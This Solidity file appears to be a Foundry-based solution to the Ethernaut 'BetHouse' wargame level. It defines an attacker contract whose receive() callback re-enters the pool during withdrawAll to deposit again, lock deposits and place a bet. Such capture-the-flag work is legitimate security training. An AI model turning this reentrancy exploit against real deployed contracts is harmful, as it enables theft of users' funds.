// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {BetHouse, Pool, PoolToken} from "../../src/ethernaut/34_BetHouse/BetHouse.sol";

contract BetHouse_Attacker {
	address player;
	
	BetHouse betHouse;
	Pool pool;
	PoolToken wrappedToken;
	PoolToken depositToken;
	
	bool isInAttacking;
	
	constructor(BetHouse betHouse_) payable {
		player = msg.sender;
		betHouse = betHouse_;
		pool = Pool(betHouse_.pool());
		wrappedToken = PoolToken(pool.wrappedToken());
		depositToken = PoolToken(pool.depositToken());
	}
	
	receive() external payable {
		if (isInAttacking) {
			uint256 amount_depositToken = depositToken.balanceOf(address(this));
			depositToken.approve(address(pool), amount_depositToken);
			pool.deposit{value: 0 ether}(amount_depositToken);
			
			console.log("receive | wrappedToken.balanceOf(address(this))", wrappedToken.balanceOf(address(this)));
			
			pool.lockDeposits();
			
			betHouse.makeBet(player);
		}
	}
	
	function doAttack() public {
		uint256 amount_depositToken = depositToken.balanceOf(address(this));
		assert(amount_depositToken > 0);
		assert(address(this).balance >= 0.001 ether);
		
		isInAttacking = true;
		
		depositToken.approve(address(pool), amount_depositToken);
		pool.deposit{value: 0.001 ether}(amount_depositToken);
		
		pool.withdrawAll();
	}
}
